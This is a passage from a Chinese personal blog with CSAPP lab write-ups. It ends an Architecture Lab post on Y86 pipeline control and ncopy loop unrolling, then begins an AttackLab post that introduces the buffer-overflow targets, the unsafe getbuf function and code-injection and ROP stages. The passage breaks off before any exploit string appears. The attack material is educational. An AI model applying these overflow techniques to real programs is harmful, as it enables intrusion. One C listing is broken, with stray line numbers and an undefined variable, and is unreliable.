M_valA;</span><br><span class="line">	# Other instructions don&#x27;t need address</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Set read control signal 	default</span><br><span class="line">bool mem_read = M_icode in &#123; IMRMOVQ, IPOPQ, IRET &#125;;</span><br><span class="line"></span><br><span class="line">## Set write control signal</span><br><span class="line">bool mem_write = M_icode in &#123; IRMMOVQ, IPUSHQ, ICALL &#125;;</span><br><span class="line"></span><br><span class="line">#/* $begin pipe-m_stat-hcl */</span><br><span class="line">## Update the status</span><br><span class="line">word m_stat = [</span><br><span class="line">	dmem_error : SADR;</span><br><span class="line">	1 : M_stat;</span><br><span class="line">];</span><br><span class="line">#/* $end pipe-m_stat-hcl */</span><br><span class="line"></span><br><span class="line">## Set E port register ID</span><br><span class="line">word w_dstE = W_dstE;</span><br><span class="line"></span><br><span class="line">## Set E port value</span><br><span class="line">word w_valE = W_valE;</span><br><span class="line"></span><br><span class="line">## Set M port register ID</span><br><span class="line">word w_dstM = W_dstM;</span><br><span class="line"></span><br><span class="line">## Set M port value</span><br><span class="line">word w_valM = W_valM;</span><br><span class="line"></span><br><span class="line">## Update processor status</span><br><span class="line">word Stat = [</span><br><span class="line">	W_stat == SBUB : SAOK;</span><br><span class="line">	1 : W_stat;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<ul>
<li>更新 PC</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">################ Pipeline Register Control ######################### 更新 PC</span><br><span class="line"></span><br><span class="line"># Should I stall or inject a bubble into Pipeline Register F? 我应该停止还是将气泡注入管道寄存器 F？</span><br><span class="line"># At most one of these can be true. 最多其中一个可能是真的。</span><br><span class="line">bool F_bubble = 0;</span><br><span class="line">bool F_stall =</span><br><span class="line">	# Conditions for a load/use hazard</span><br><span class="line">	E_icode in &#123; IMRMOVQ, IPOPQ &#125; &amp;&amp;	</span><br><span class="line">	 E_dstM in &#123; d_srcA, d_srcB &#125; ||</span><br><span class="line">	# Stalling at fetch while ret passes through pipeline</span><br><span class="line">	IRET in &#123; D_icode, E_icode, M_icode &#125;;</span><br><span class="line"></span><br><span class="line"># Should I stall or inject a bubble into Pipeline Register D?</span><br><span class="line"># At most one of these can be true.</span><br><span class="line">bool D_stall = </span><br><span class="line">	# Conditions for a load/use hazard</span><br><span class="line">	E_icode in &#123; IMRMOVQ, IPOPQ &#125; &amp;&amp;	</span><br><span class="line">	 E_dstM in &#123; d_srcA, d_srcB &#125;;</span><br><span class="line"></span><br><span class="line">bool D_bubble =</span><br><span class="line">	# Mispredicted branch</span><br><span class="line">	(E_icode == IJXX &amp;&amp; !e_Cnd) ||</span><br><span class="line">	# Stalling at fetch while ret passes through pipeline</span><br><span class="line">	# but not condition for a load/use hazard</span><br><span class="line">	!(E_icode in &#123; IMRMOVQ, IPOPQ &#125; &amp;&amp; E_dstM in &#123; d_srcA, d_srcB &#125;) &amp;&amp;	</span><br><span class="line">	  IRET in &#123; D_icode, E_icode, M_icode &#125;;</span><br><span class="line"></span><br><span class="line"># Should I stall or inject a bubble into Pipeline Register E?</span><br><span class="line"># At most one of these can be true.</span><br><span class="line">bool E_stall = 0;</span><br><span class="line">bool E_bubble =</span><br><span class="line">	# Mispredicted branch</span><br><span class="line">	(E_icode == IJXX &amp;&amp; !e_Cnd) ||</span><br><span class="line">	# Conditions for a load/use hazard</span><br><span class="line">	E_icode in &#123; IMRMOVQ, IPOPQ &#125; &amp;&amp;	</span><br><span class="line">	 E_dstM in &#123; d_srcA, d_srcB&#125;;</span><br><span class="line"></span><br><span class="line"># Should I stall or inject a bubble into Pipeline Register M?</span><br><span class="line"># At most one of these can be true.</span><br><span class="line">bool M_stall = 0;</span><br><span class="line"># Start injecting bubbles as soon as exception passes through memory stage</span><br><span class="line">bool M_bubble = m_stat in &#123; SADR, SINS, SHLT &#125; || W_stat in &#123; SADR, SINS, SHLT &#125;;</span><br><span class="line"></span><br><span class="line"># Should I stall or inject a bubble into Pipeline Register W?</span><br><span class="line">bool W_stall = W_stat in &#123; SADR, SINS, SHLT &#125;;</span><br><span class="line">bool W_bubble = 0;</span><br></pre></td></tr></table></figure>

<h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><ul>
<li>在测试前，和 Part B 一样需要修改 makefile 文件，这里就不再赘述了</li>
<li>通过命令 <strong>make VERSION-full</strong> 构建新的模拟器</li>
<li>通过命令 **(cd ..&#x2F;y86-code; make testpsim)**，在基准测试程序上测试管道模拟器，运行结果如下：Succeeds</li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240317180950633.png" class="" title="image-20240317180950633">

<ul>
<li>通过命令 **(cd ..&#x2F;ptest; make SIM&#x3D;..&#x2F;pipe&#x2F;psim TFLAGS&#x3D;-i)**，使用广泛的回归测试来测试管道模拟器，运行结果如下：Succeeds</li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240317181118288.png" class="" title="image-20240317181118288">

<ul>
<li>以上测试说明在 pipe-full.hcl 中实现的 iaddq 是正确的，接下来需要修改 ncopy.ys 文件让它运行的更快</li>
</ul>
<h2 id="修改-ncopy-ys-文件"><a href="#修改-ncopy-ys-文件" class="headerlink" title="修改 ncopy.ys 文件"></a>修改 ncopy.ys 文件</h2><ul>
<li>ncopy.ys 最初的汇编代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax				# count = 0;</span><br><span class="line">	andq %rdx,%rdx				# len &lt;= 0?</span><br><span class="line">	jle Done					# if so, goto Done:</span><br><span class="line"></span><br><span class="line">Loop:	mrmovq (%rdi), %r10		# val = *src</span><br><span class="line">	rmmovq %r10, (%rsi)			# *dest = val</span><br><span class="line">	andq %r10, %r10				# val &lt;= 0?</span><br><span class="line">	jle Npos					# if so, goto Npos:</span><br><span class="line">	irmovq $1, %r10</span><br><span class="line">	addq %r10, %rax				# count++</span><br><span class="line">Npos:	irmovq $1, %r10</span><br><span class="line">	subq %r10, %rdx				# len--</span><br><span class="line">	irmovq $8, %r10</span><br><span class="line">	addq %r10, %rdi				# src++</span><br><span class="line">	addq %r10, %rsi				# dst++</span><br><span class="line">	andq %rdx,%rdx				# len &gt; 0?</span><br><span class="line">	jg Loop						# if so, goto Loop:</span><br></pre></td></tr></table></figure>

<ul>
<li>通过命令 <strong>.&#x2F;benchmark.pl</strong> 对他进行评分，分数为 0！！！</li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240318211720189.png" class="" title="image-20240318211720189">

<ul>
<li>根据提示使用 8 * 8 展开，目的是：减少了索引计算的次数，减少了条件分支的判断次数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ncopy - copy src to dst, returning number of positive ints</span></span><br><span class="line"><span class="comment"> * contained in src array.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="type">word_t</span> <span class="title function_">ncopy</span><span class="params">(<span class="type">word_t</span> *src, <span class="type">word_t</span> *dst, <span class="type">word_t</span> len)</span></span><br><span class="line"> &#123;</span><br><span class="line">		<span class="type">word_t</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="type">word_t</span> val1;</span><br><span class="line">    	<span class="type">word_t</span> val2;</span><br><span class="line">    	<span class="type">word_t</span> val3;</span><br><span class="line">    	<span class="type">word_t</span> val4;</span><br><span class="line">    	<span class="type">word_t</span> val5;</span><br><span class="line">    	<span class="type">word_t</span> val6;</span><br><span class="line">    	<span class="type">word_t</span> val7;</span><br><span class="line">     	<span class="type">word_t</span> val8;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			val1 = *src++;</span><br><span class="line">            val2 = *src++;</span><br><span class="line">            val3 = *src++;</span><br><span class="line">            val4 = *src++;</span><br><span class="line">            val5 = *src++;</span><br><span class="line">            val6 = *src++;</span><br><span class="line">            val7 = *src++;</span><br><span class="line">            val8 = *src++;</span><br><span class="line">            </span><br><span class="line">			*dst++ = val1;</span><br><span class="line">            *dst++ = val2;</span><br><span class="line">            *dst++ = val3;</span><br><span class="line">            *dst++ = val4;</span><br><span class="line">            *dst++ = val5;</span><br><span class="line">            *dst++ = val6;</span><br><span class="line">            *dst++ = val7;</span><br><span class="line">            *dst++ = val8;</span><br><span class="line">			</span><br><span class="line">            <span class="keyword">if</span> (val1 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val2 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val3 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val4 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val5 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val6 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val7 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val8 &gt; <span class="number">0</span>) count++;</span><br><span class="line">			</span><br><span class="line">            len -= <span class="number">8</span>;</span><br><span class="line">		&#125;</span><br><span class="line">     </span><br><span class="line">    	 <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            val1 = *src++;</span><br><span class="line"><span class="number">12</span>			*dst++ = val;</span><br><span class="line"><span class="number">13</span>			<span class="keyword">if</span> (val1 &gt; <span class="number">0</span>)</span><br><span class="line"><span class="number">14</span>				count++;</span><br><span class="line"><span class="number">15</span>			len--;</span><br><span class="line">         &#125;</span><br><span class="line">		</span><br><span class="line">     	<span class="keyword">return</span> count;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>汇编代码如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax			# count = 0	</span><br><span class="line">	andq %rdx,%rdx				</span><br><span class="line">	jle Done				# if len &lt;= 0，return</span><br><span class="line">	jmp test			</span><br><span class="line">loop1:						# 进入 8*8 展开</span><br><span class="line">	mrmovq (%rdi), %r8</span><br><span class="line">	mrmovq 8(%rdi), %r9</span><br><span class="line">	mrmovq 16(%rdi), %r10</span><br><span class="line">	mrmovq 24(%rdi), %r11</span><br><span class="line">	mrmovq 32(%rdi), %r12</span><br><span class="line">	mrmovq 40(%rdi), %r13</span><br><span class="line">	mrmovq 48(%rdi), %r14</span><br><span class="line">	mrmovq 56(%rdi), %rbx</span><br><span class="line">	</span><br><span class="line">	rmmovq %r8, (%rsi)</span><br><span class="line">	rmmovq %r9, 8(%rsi)</span><br><span class="line">	rmmovq %r10, 16(%rsi)</span><br><span class="line">	rmmovq %r11, 24(%rsi)</span><br><span class="line">	rmmovq %r12, 32(%rsi)</span><br><span class="line">	rmmovq %r13, 40(%rsi)</span><br><span class="line">	rmmovq %r14, 48(%rsi)</span><br><span class="line">	rmmovq %rbx, 56(%rsi)</span><br><span class="line">	</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle loop2</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop2:</span><br><span class="line">	andq %r9, %r9</span><br><span class="line">	jle loop3</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop3:</span><br><span class="line">	andq %r10, %r10</span><br><span class="line">	jle loop4</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop4:</span><br><span class="line">	andq %r11, %r11</span><br><span class="line">	jle loop5</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop5:</span><br><span class="line">	andq %r12, %r12</span><br><span class="line">	jle loop6</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop6:</span><br><span class="line">	andq %r13, %r13</span><br><span class="line">	jle loop7</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop7:</span><br><span class="line">	andq %r14, %r14</span><br><span class="line">	jle loop8</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop8:</span><br><span class="line">	andq %rbx, %rbx</span><br><span class="line">	jle else</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">else:</span><br><span class="line">	iaddq $64, %rdi</span><br><span class="line">	iaddq $64, %rsi</span><br><span class="line">test:</span><br><span class="line">	iaddq $-8, %rdx	</span><br><span class="line">	jg loop1			# if len - 8 &gt; 0，进入 8*8 展开</span><br><span class="line">	iaddq $8, %rdx		</span><br><span class="line">loop:					</span><br><span class="line">	mrmovq (%rdi), %r8</span><br><span class="line">	rmmovq %r8, (%rsi)</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle else2</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">else2:</span><br><span class="line">	iaddq $-1, %rdx</span><br><span class="line">	iaddq $8, %rdi</span><br><span class="line">	iaddq $8, %rsi</span><br><span class="line">	andq %rdx, %rdx</span><br><span class="line">	jg loop</span><br><span class="line">Done:</span><br><span class="line">	ret		</span><br></pre></td></tr></table></figure>

<ul>
<li>通过命令 <strong>.&#x2F;correctness.pl</strong> 测试程序正确性，**.&#x2F;benchmark.pl** 进行打分</li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240318223406738.png" class="" title="image-20240318223406738">

<ul>
<li>然而，分数还是很低 ……</li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240319150433776.png" class="" title="image-20240319150433776">

<ul>
<li>改变指令执行序列再试一下，这里还通过同时 <code>mrmovq</code> 两次避免和 <code>rmmovq</code>  产生加载&#x2F;使用冒险，减少 bubble</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax			# count = 0	</span><br><span class="line">	andq %rdx,%rdx				</span><br><span class="line">	jle Done				# if len &lt;= 0，return</span><br><span class="line">	jmp test			</span><br><span class="line">loop1:						# 进入 8*8 展开</span><br><span class="line">	mrmovq (%rdi), %r8</span><br><span class="line">	mrmovq 8(%rdi), %r9</span><br><span class="line">	rmmovq %r8, (%rsi)</span><br><span class="line">	rmmovq %r9, 8(%rsi)</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle loop2</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop2:</span><br><span class="line">	andq %r9, %r9</span><br><span class="line">	jle loop3</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop3:	</span><br><span class="line">	mrmovq 16(%rdi), %r8</span><br><span class="line">	mrmovq 24(%rdi), %r9</span><br><span class="line">	rmmovq %r8, 16(%rsi)</span><br><span class="line">	rmmovq %r9, 24(%rsi)</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle loop4</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop4:</span><br><span class="line">	andq %r9, %r9</span><br><span class="line">	jle loop5</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop5:</span><br><span class="line">	mrmovq 32(%rdi), %r8</span><br><span class="line">	mrmovq 40(%rdi), %r9</span><br><span class="line">	rmmovq %r8, 32(%rsi)</span><br><span class="line">	rmmovq %r9, 40(%rsi)</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle loop6</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop6:</span><br><span class="line">	andq %r9, %r9</span><br><span class="line">	jle loop7</span><br><span class="line">	iaddq $1, %rax	</span><br><span class="line">loop7:</span><br><span class="line">	mrmovq 48(%rdi), %r8</span><br><span class="line">	mrmovq 56(%rdi), %r9</span><br><span class="line">	rmmovq %r8, 48(%rsi)</span><br><span class="line">	rmmovq %r9, 56(%rsi)</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle else</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">else:	</span><br><span class="line">	iaddq $64, %rdi</span><br><span class="line">	iaddq $64, %rsi</span><br><span class="line">test:</span><br><span class="line">	iaddq $-8, %rdx	</span><br><span class="line">	jg loop1			# if len - 8 &gt; 0，进入 8*8 展开</span><br><span class="line">	iaddq $8, %rdx		</span><br><span class="line">loop:					</span><br><span class="line">	mrmovq (%rdi), %r8</span><br><span class="line">	rmmovq %r8, (%rsi)</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle else2</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">else2:</span><br><span class="line">	iaddq $-1, %rdx</span><br><span class="line">	iaddq $8, %rdi</span><br><span class="line">	iaddq $8, %rsi</span><br><span class="line">	andq %rdx, %rdx</span><br><span class="line">	jg loop</span><br><span class="line">Done:</span><br><span class="line">	ret		</span><br></pre></td></tr></table></figure>

<ul>
<li>得分如下，有一些提升</li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240319154038991.png" class="" title="image-20240319154038991">

<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/480380496">CSAPP | Lab4-Architecture Lab 深入解析 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/109824219">读书笔记]CSAPP：ArchLab - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42234461/article/details/108720264">【深入理解计算机系统】CSAPP-实验四：ArchLab全网最详细_在sim&#x2F;misc目录中完成以下c代码中三个函数从c语言到y86-64汇编语言的翻译-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://littlecsd.net/2019/01/18/csapp-Archlab/">csapp-Archlab | Little csd’s blog</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yiweiboi.github.io/2024/03/11/CSAPP-Lab3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yiweiBoi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/03/11/CSAPP-Lab3/" class="post-title-link" itemprop="url">CSAPP AttackLab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-03-11 10:29:55" itemprop="dateCreated datePublished" datetime="2024-03-11T10:29:55+08:00">2024-03-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-27 14:33:57" itemprop="dateModified" datetime="2024-03-27T14:33:57+08:00">2024-03-27</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
<li><p>开始实验前强烈建议读一下官方的说明文档：<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf (cmu.edu)</a></p>
</li>
<li><p><strong>ctarget</strong>：易受到代码注入攻击的可执行程序</p>
</li>
<li><p><strong>rtarget</strong>：易受到面向返回编程攻击的可执行程序</p>
</li>
<li><p><strong>cookie.txt</strong>：一个 8 位十六进制代码，您将在攻击中用作唯一标识符</p>
</li>
<li><p><strong>fram.c</strong>：目标的 “小工具农场” 的源代码，您将使用它来生成面向返回的编程攻击</p>
</li>
<li><p><strong>hex2raw</strong>：用于生成攻击字符串的实用程序</p>
</li>
<li><p>CTARGET 和 RTARGET 都从标准输入读取字符串。他们使用下面定义的函数 getbuf 来执行此操作：</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">2 &#123;</span><br><span class="line"><span class="number">3</span> 		<span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line"><span class="number">4</span> 		Gets(buf);</span><br><span class="line"><span class="number">5</span> 		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">6</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>函数 Gets 类似于标准库函数 gets，它从标准输入读取字符串，并将其存储在指定的目标位置</p>
<p>函数 Gets 和 gets 都无法确定其目标缓冲区是否足够大来存储它们读取的字符串。它们只是复制字节序列，可能会超出目标分配的存储边界</p>
</blockquote>
<ul>
<li>前三个实验涉及对 CTARGET 的代码注入（CI）攻击，而后两个涉及对 RTARGET 的面向返回编程（ROP）攻击</li>
</ul>
<img src="/2024/03/11/CSAPP-Lab3/image-20240314104441467.png" class="" title="image-20240314104441467">

<h1 id="Code-Injection-Attacks"><a href="#Code-Injection-Attacks" class="headerlink" title="Code Injection Attacks"></a>Code Injection Attacks</h1><ul>
<li>在前三个阶段，您的漏洞利用字符串将攻击 CTARGET</li>
<li>该程序的设置方式是，堆栈位置在一次运行到下一次运行之间保持一致，因此堆栈上的数据可以被视为可执行代码</li>
<li>这些功能使程序容易受到攻击，其中漏洞利用字符串包含可执行代码的字节编码</li>
</ul>
<h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><ul>
<li><p>对于第 1 阶段，您将不会注入新代码，相反，您的攻击字符串将重定向程序以执行现有过程</p>
</li>
<li><p>函数 getbuf 由具有以下 C 代码的函数测试在 CTARGET 中调用</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">2 &#123;</span><br><span class="line"><span class="number">3</span> 		<span class="type">int</span> val;</span><br><span class="line"><span class="number">4</span> 		val = getbuf();</span><br><span class="line"><span class="number">5</span> 		<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line"><span class="number">6</span> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>getbuf 执行 return 语句时，程序通常会在 test 的第 5 行恢复执行</li>
<li>我们想改变这种行为，在文件 ctarget 中，有一个函数 touch1 的代码，具有以下 C 表示形式</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">2 &#123;</span><br><span class="line"><span class="number">3</span> 		vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="number">4</span> 		<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line"><span class="number">5</span> 		validate(<span class="number">1</span>);</span><br><span class="line"><span class="number">6</span> 		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">7</span> &#125;</span><br></pre></td></tr></table></figure>

<ul>
